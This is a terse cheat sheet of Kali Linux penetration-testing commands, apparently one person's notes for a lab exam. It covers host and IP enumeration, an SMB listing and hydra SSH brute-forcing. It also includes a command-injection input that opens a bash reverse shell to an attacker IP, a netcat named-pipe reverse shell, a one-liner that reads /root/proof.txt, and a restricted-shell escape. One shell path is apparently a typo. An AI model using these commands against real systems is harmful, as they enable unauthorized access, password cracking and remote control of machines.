hash-identifier       				                                                                                         --> to identify hash name

root@kali:~# grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1               ------>  UNION
cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u >list.txt                             --------> URL SAVE IN LIST FILE
for url in $(cat list.txt); do host $url; done | grep "has address" |cut -d " " -f 4 | sort -u     ----->   HOST RESELOV

  cat /etc/issue															-----> operating system  find 

 nbtscan  TARGET IP 													----------> username

  smbclient -L //10.11.1.22												----------> enum

/usr/bin/google-chrome-stable %U --no-sandbox								----------> google chorme start

hydra –L <username_list> -P <password_list> -t 3 192.168.0.5 ssh

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

for i in `seq 1 255`; do ping -c 1 10.11.1.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done   ----------------------------->  save .sh and use for iplist genrate


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input: 127.0.0.1; bash -i >& /dev/tcp/Attacker IP/443 0>&1  		------------------------------  reverse connection 

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
get proof.txt


echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "


------------------------------------------------------------------------------------------------------------------------------------------------------------------------

/base/bin -c "/bin/sh 0</tmp/backpipe | nc 10.1.1.1 443 1>/tmp/backpipe"

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Limited shell  bypass

http://securebean.blogspot.com/2014/05/escaping-restricted-shell_3.html

echo os.system('/bin/bash')
